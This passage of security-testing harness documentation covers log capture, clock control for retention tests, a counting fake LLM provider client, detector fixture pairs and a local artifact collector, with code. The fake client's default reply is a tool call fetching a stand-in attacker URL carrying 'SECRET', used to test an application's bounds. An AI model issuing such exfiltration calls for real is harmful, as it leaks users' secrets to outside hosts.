    was_level, was_propagate = logger.level, logger.propagate
    logger.addHandler(cap)
    logger.setLevel(logging.DEBUG)  # a level-filtered record is not evidence of absence
    logger.propagate = True
    try:
        yield cap
    finally:
        logger.removeHandler(cap)
        logger.setLevel(was_level)
        logger.propagate = was_propagate
```

**Porting note.** Node: replace the **transport**, not the logger. `pino` takes a custom destination stream — push the raw line, because the serializers run on the way to the stream. `winston` takes a `Transport` subclass whose `log(info)` should keep `info[Symbol.for('message')]` (the formatted line) *and* `info` itself. Go: wrap `slog.Handler` and keep both the `Record` and the encoded output. Java: a Logback `ListAppender` with the real encoder attached — a bare `ListAppender` keeps events and never runs the encoder, which is the same mistake as mocking the logger. Anything routed through `structlog` or `loguru` needs that library's own sink unless the repository already bridges it into stdlib `logging`; check which, because attaching a `logging.Handler` to a `loguru`-only application captures nothing and reports clean.

**Cited by** `hipaa-and-phi`, `privacy-and-data-protection`, `threat-modeling`. `web-and-api`'s canary-sweep recipe describes the same component in place ("a capturing handler to the real logger — not a mock, so formatters and serializers actually run") without naming it.

---

## Clock control

**What it does.** Moves time deterministically so a retention, expiry, deadline or purge assertion is an assertion rather than a sleep. Freeze at a chosen instant, run the code, advance, run the purge explicitly, assert.

**Both directions, always.** The row outside the window is gone **and** the row inside the window is untouched. The second half is the entire value: without it, "delete everything" passes the test.

**Tier.** T1.

**The trap that matters most: freezing the process clock does not move the database's clock.** A purge whose predicate is evaluated server-side — `WHERE created_at < NOW() - INTERVAL '30 days'` — is completely unaffected by `freezegun` or a fake `Date`. The test then passes or fails for reasons unrelated to the code. Two ways out, and the test must state which one it used:

- **Back-date the rows** instead of moving the clock: seed at `now - 31d` and `now - 29d` and run the purge at the real present. Works against a server-side predicate, and is usually the right answer.
- **Inject the cutoff** so the purge takes an instant rather than reading one. Works everywhere and is often a patch worth recommending on its own.

A second trap: the monotonic clock. `time.monotonic()` and `performance.now()` are frequently *not* moved by the freezing library, so a TTL measured on the monotonic clock will not expire no matter how far you advance the wall clock. Check which clock the code reads before concluding the cache never expires — or that it does.

```javascript
// test/security/harness/clock.mjs — node:test built-in mock timers
export function atInstant(t, iso) {
  t.mock.timers.enable({ apis: ['Date', 'setTimeout'], now: new Date(iso).getTime() })
  return {
    advanceDays: (n) => t.mock.timers.tick(n * 86_400_000),
    release: () => t.mock.timers.reset(),
  }
}
```

```javascript
test('purge deletes outside the window and leaves inside untouched', async (t) => {
  const clock = atInstant(t, '2026-02-01T00:00:00Z')
  t.after(() => clock.release())

  // Back-dated rather than clock-shifted: the purge predicate is evaluated by
  // the database, which never saw the fake clock.
  const inside = await seed({ createdAt: daysAgo(29) })
  const outside = await seed({ createdAt: daysAgo(31) })

  await runPurgeJob()                    // explicitly; never wait on a schedule

  assert.equal(await exists(outside.id), false, 'row past the window survived the purge')
  assert.equal(await exists(inside.id), true, 'purge is over-broad: it took a row inside the window')
})
```

Calendar arithmetic is a separate assertion from the frozen instant, and the instant has to be chosen to expose it. A request received on 31 January is due 28 or 29 February and **not** 2 March — so freeze once at `2024-01-31` and once at `2025-01-31` and assert both, or the leap-year branch never runs.

**Porting note.** Python: `freezegun.freeze_time` is the common choice; `time_machine` also moves `time.monotonic`, which is the difference that decides a TTL test. Jest: `jest.useFakeTimers().setSystemTime(...)`. Go: there is no global clock to freeze — the code must accept a clock interface, and where it does not, "there is no seam" is the finding. Java: `java.time.Clock.fixed(...)` injected at the construction site; code calling `Instant.now()` directly cannot be tested and that is worth saying. In every language, advancing a fake clock does not run a scheduler: invoke the purge or expiry job directly.

**Cited by** `hipaa-and-phi`, `llm-and-ai`, `privacy-and-data-protection` — two of them naming the concrete tools (`freezegun` / `jest.setSystemTime`) alongside the component name.

---

## Counting fake provider client

Also cited as the **counting fake client**. Same component; `web-and-api` uses the shorter name for a downstream API and `llm-and-ai` the longer one for a model provider.

**What it does.** Stands in for an expensive dependency with a scripted, worst-case-compliant response — one that *always* returns another tool call, always emits the exfiltration URL, always complies — and records every call with its arguments.

**The assertion is on the recorded calls, never on the response.** A system that executes and then truncates looks identical from the outside to one that refused. Only the counter distinguishes them. And a fake that always complies is what makes the test deterministic: the recipe tests the application's bounds, not the dependency's judgement, which is the only property that survives a provider upgrade.

**Tier.** T1.

```javascript
// test/security/harness/counting-fake.mjs
export function countingFake({ script, budget = Infinity } = {}) {
  const calls = []
  const reply = script ?? (() => ({
    // Worst-case-compliant: always another tool call, always the exfil URL.
    tool_calls: [{ name: 'fetch', arguments: { url: 'https://attacker.test/p?d=SECRET' } }],
  }))
  return {
    calls,
    count: () => calls.length,
    reset: () => calls.splice(0),
    client: {
      async create(request) {
        calls.push({ request, index: calls.length })
        if (calls.length > budget) throw new Error('provider budget exhausted')
        return reply(request, calls.length)
      },
    },
  }
}
```

Assertions, each catching a distinct bug:

- **Iteration cap** — `assert.equal(spy.count(), CONFIGURED_CAP)`, *exactly*, not `<=`. Terminating at cap-minus-one is a different bug; terminating at cap × retries is retry amplification and the multiplier is the finding.
- **Input cap** — submit a five-million-character field, assert a 413 or validation error **and `spy.count() === 0`**. A rejection after the call was billed is the finding.
- **Output cap** — assert every recorded request carried an output bound, parametrized over every call site the enumerator finds, so a new call site added without one fails.
- **Fan-out cap** — drive the loop with a thousand attacker-influenced items and assert the count is bounded by a constant, not by the collection length.
- **Per-principal budget** — exhaust as A, assert the hard stop, then assert B is unaffected. A shared counter is a denial-of-service channel between tenants.
- **The resolver variant** — where a depth, complexity or batch limit rejects a query, assert the resolver spies recorded **zero** calls. A server that validates after resolving has already done the work.

Reset the counter and any limiter store in a fixture, or the suite becomes order-dependent and the second run of any capped test passes for the wrong reason.

**Porting note.** Python: a small class holding a `calls` list. Prefer it over a bare `unittest.mock.Mock(return_value=...)`, because `assert_called_once` cannot tell you the arguments of the four-hundredth call and the argument list is half the evidence. Patch **where the name is looked up** (`myapp.agent.OpenAI`), not where it is defined, or the application keeps its real client and the fake records nothing — a zero count that reads as a pass. Go: implement the interface with a mutex-guarded counter and run the fan-out test under `-race`; an unsynchronised counter under concurrency produces a count that is wrong in the direction that passes.

**Cited by** `llm-and-ai` (as the counting fake provider client) and `web-and-api` (as the counting fake client).

---

## Detector-and-fixture-pair runner

**What it does.** Executes a static checker over a committed pair of fixtures under the repository's own test runner and asserts both directions — fires on the vulnerable fixture, silent on the clean one. This is the component that makes a static check **T1 instead of T0**, and `cicd-and-supply-chain` names that resolution as load-bearing for its severities.

**Tier.** T1, by construction. That is the whole purpose.

**Six rules, and every one of them exists because a checker without it looked green while missing the bug.**

1. **Both directions, as counts.** `detect(vulnerable).length == 1` and `detect(clean).length == 0`. Counts rather than booleans, so a rule that matches twice is distinguishable from a rule that matches once.
2. **Assert against the rendered artifact, never the source.** A module, a variable default, an overlay or a template can flip any setting, so a grep over source files audits the wrong text. Render first: the plan JSON, the built manifest, the templated Kubernetes stream, the built page markup, the merged release manifest.
3. **Iterate resources, not files.** The assertion is "for each resource of type T, setting S holds", and the failure message names the resource address. A rule written as "the file does not contain S" is file-granularity thinking moved into the test suite, where it looks green forever. Seed the fixtures with the multi-resource shapes that expose it: five buckets and one access-block resource, a four-document manifest with one security context, a two-stage build with the safe directive only in the first stage.
4. **Absence-shaped rules need one extra assertion.** A rule that fires on a *missing* artifact can pass by matching nothing at all. Assert that it fires on a fixture from which the artifact has been deliberately removed.
5. **Assert the rule set is non-empty.** A conformance check against zero rules passes perfectly and proves nothing, so a deleted rule must not read as compliance.
6. **Run the tightened rule against the previous revision and require it to fail there.** `git show HEAD~1:path` into the same checker. A rule that passes on both revisions of a change that was supposed to introduce the fix is not looking at the file.

```javascript
// test/security/harness/pair.mjs
import { test } from 'node:test'
import assert from 'node:assert/strict'

/**
 * detect(artifact) -> [{ where, rule, detail }]
 * `where` is a resource address, never a filename. It is what the failure
 * message prints and what a reviewer uses to find the resource.
 */
export function pairTest(name, detect, { vulnerable, clean, expected = 1 }) {
  test(`${name}: fires on the vulnerable fixture, silent on the clean one`, () => {
    const fired = detect(vulnerable())
    const quiet = detect(clean())
    assert.equal(fired.length, expected,
      `expected ${expected} finding(s) on the vulnerable fixture, got ${JSON.stringify(fired)}`)
    assert.equal(quiet.length, 0,
      `clean fixture produced findings: ${JSON.stringify(quiet)}`)
    for (const f of fired) {
      assert.ok(f.where, 'every finding must carry a resource address, not a filename')
    }
  })
}

/** For rules that fire on an absence: prove they fire when it is removed. */
export function absenceTest(name, detect, { withArtifact, withoutArtifact }) {
  test(`${name}: fires when the artifact is removed`, () => {
    assert.equal(detect(withArtifact()).length, 0)
    assert.equal(detect(withoutArtifact()).length, 1,
      'an absence rule that does not fire on a removed artifact passes by matching nothing')
  })
}
```

```javascript
// A rule, written over the parsed structure rather than over raw text.
export function detectUnpinnedUses(workflow) {
  const PINNED = /^[^./][^@]*@(?:[0-9a-f]{40}|sha256:[0-9a-f]{64})$/
  const out = []
  for (const [jobName, job] of Object.entries(workflow.jobs ?? {})) {
    ;(job.steps ?? []).forEach((step, i) => {
      if (!step.uses || step.uses.startsWith('./')) return
      if (!PINNED.test(step.uses)) {
        out.push({ where: `jobs.${jobName}.steps[${i}]`, rule: 'ref-pinning', detail: step.uses })
      }
    })
  }
  return out
}
```

Note both digest forms in that alternation: a 40-hex commit for a repository reference and an OCI `sha256:` digest for a container reference. A 40-hex-only rule manufactures a finding against a correctly digest-pinned container action, which is a false positive the fix itself produces.

**Porting note.** Python: `pytest.mark.parametrize` over `(fixture, expected_count)` with the same two-direction discipline. Prefer the engine's own pair mechanism where the repository already runs one, because then the pair runs inside the repository's existing command and no new harness is needed: `conftest test fixtures/vulnerable/x.yaml fixtures/clean/x.yaml`, `kyverno apply` against the same pair, Semgrep's `# ruleid:` / `# ok:` annotations, an import-restriction rule file with one deliberately violating import committed beside it. For a policy engine, assert the **enforcement mode** as well as the rule — an audit-only policy blocks nothing, so an audit-mode policy belongs in the fixture set as a *vulnerable* fixture rather than as a clean one.

**Cited by** `cicd-and-supply-chain`. Four other lenses — `cloud-and-iac`, `hipaa-and-phi`, `mobile-app-security`, `privacy-and-data-protection` — build the same shape in their own recipes and state the same two-direction rule without naming the component; `cloud-and-iac` and `threat-modeling` additionally depend on it for their tier rules.

---

## Local log and artifact collector

**What it does.** Runs a build or test command locally and gathers everything it wrote — stdout, stderr, exit status, the artifact and upload directories, the cache directory, the built image's layers — into one place a canary sweep can walk. It exists so the sweep never needs a hosted provider's API.

**The rail is part of the component.** It collects locally produced output only. Downloading a real run's logs or artifacts from a provider's API reaches a remote host and is out of rails, and so is sending a canary to a hosted collector or request bin. Both appeared in recipes this project inherited; both are gone.

**Tier.** T1.

**Two traps that make a sweep pass for the wrong reason.**

1. **A truncated haystack.** Node's `spawnSync` caps captured output at 1 MB by default and truncates silently past it — and a build log exceeds that routinely. Raise the cap or stream to a file.
2. **A haystack of zero bytes.** Write a manifest of what was collected, with sizes, and assert it is non-empty. Otherwise a collector pointed at a directory the build never created produces a perfect clean result.

```javascript
// test/security/harness/collect.mjs
import { spawnSync } from 'node:child_process'
import { mkdtempSync, writeFileSync, readdirSync, readFileSync, statSync } from 'node:fs'
import { join } from 'node:path'
import { tmpdir } from 'node:os'

function* walk(dir) {
  for (const entry of readdirSync(dir, { withFileTypes: true })) {
    const p = join(dir, entry.name)
    if (entry.isDirectory()) yield* walk(p)
    else if (entry.isFile()) yield p
  }
}

export function collectLocalRun({ command, args = [], env = {}, artifactDirs = [] }) {
  const dir = mkdtempSync(join(tmpdir(), 'audit-collect-'))
  const run = spawnSync(command, args, {
    env: { ...process.env, ...env },
    encoding: 'utf8',
    maxBuffer: 256 * 1024 * 1024,  // the 1 MB default truncates a build log in silence
  })
  writeFileSync(join(dir, 'stdout.log'), run.stdout ?? '')
  writeFileSync(join(dir, 'stderr.log'), run.stderr ?? '')
  writeFileSync(join(dir, 'exit.json'), JSON.stringify({ status: run.status, signal: run.signal }))

  const sinks = [...walk(dir), ...artifactDirs.flatMap((d) => [...walk(d)])]
  const manifest = sinks.map((p) => ({ path: p, bytes: statSync(p).size }))
  writeFileSync(join(dir, 'manifest.json'), JSON.stringify(manifest, null, 2))

  const total = manifest.reduce((n, f) => n + f.bytes, 0)
  if (total === 0) throw new Error('collector gathered zero bytes; the sweep below would vacuously pass')

  // Buffers, not strings: a layer tar or a compiled bundle must be searched as
  // bytes. Decoding it as UTF-8 can destroy the sequence you are hunting for.
  return { dir, status: run.status, manifest, read: (p) => readFileSync(p) }
}
```

The image and state cases are the same collector pointed at different output: `docker save` the built image and walk every layer tar — which catches a secret written in one layer and deleted in a later one, something a history listing does not show — and a rendered plan or state JSON for the values a data source pulled into state.

**Porting note.** Python: `subprocess.run(capture_output=True)` has no size cap but holds the whole log in memory; for a large build redirect `stdout=` and `stderr=` to open files instead. Shell: `command 2>&1 | tee out.log` loses the exit status unless `pipefail` is set — which is exactly the defect `cicd-and-supply-chain`'s fail-open recipe exists to catch, so do not reproduce it inside the harness that tests for it.

**Cited by** `cicd-and-supply-chain`.

---

## Component index

Every component defined above, with the lenses that cite it by name in their `## Proof recipes` block.

| Component | Cited by | Count |
|---|---|---|
| Canary fixture set | cicd-and-supply-chain, cloud-and-iac, crypto-and-key-management, hipaa-and-phi, llm-and-ai, mobile-app-security, privacy-and-data-protection, salesforce-platform, threat-modeling, web-and-api | 10 |
| Registry-driven enumerator | cloud-and-iac, crypto-and-key-management, hipaa-and-phi, llm-and-ai, privacy-and-data-protection, salesforce-platform, threat-modeling, web-and-api | 8 |
| Socket-layer destination recorder | cloud-and-iac, hipaa-and-phi, llm-and-ai, mobile-app-security, privacy-and-data-protection, threat-modeling, web-and-api | 7 |
| Two-subject fixture | crypto-and-key-management, llm-and-ai, salesforce-platform, web-and-api | 4 |
| Capturing log handler | hipaa-and-phi, privacy-and-data-protection, threat-modeling | 3 |
| Clock control | hipaa-and-phi, llm-and-ai, privacy-and-data-protection | 3 |
| Counting fake provider client | llm-and-ai; web-and-api (as *counting fake client*) | 2 |
| Detector-and-fixture-pair runner | cicd-and-supply-chain | 1 |
| Local log and artifact collector | cicd-and-supply-chain | 1 |

**Adding a component.** A new section here is justified when a second lens needs the same thing. Until then the recipe carries its own implementation in place, because a harness section that one lens reads is indirection with no payoff. The two single-citation entries above are here for a different reason: both are named in a lens's manifest sentence, so both must resolve, and both encode a rule the whole corpus depends on — the two-direction detector assertion and the locally-produced-output-only rail.
